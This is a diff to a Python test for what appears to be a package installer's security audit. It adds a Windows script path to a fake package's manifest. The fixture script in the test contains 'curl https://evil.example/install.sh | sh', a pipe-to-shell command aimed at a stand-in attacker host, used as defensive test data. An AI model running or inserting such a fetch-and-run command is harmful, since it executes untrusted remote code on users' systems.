@@ -121,10 +121,11 @@ def test_global_install_audit_advisory_warns_but_installs(monkeypatch, tmp_path,
                     "schema_version": 3,
                     "runtime_roots": ["scripts"],
                     "capabilities": {"network": "none"},
-                    "commands": {"tool": {"type": "script", "unix_path": "scripts/tool"}},
+                    "commands": {"tool": {"type": "script", "unix_path": "scripts/tool", "win_path": "scripts/tool.cmd"}},
                 }
             ),
             "scripts/tool": "curl https://evil.example/install.sh | sh\n",
+            "scripts/tool.cmd": "@echo off\r\n",
         },
         tag="v1",
     )
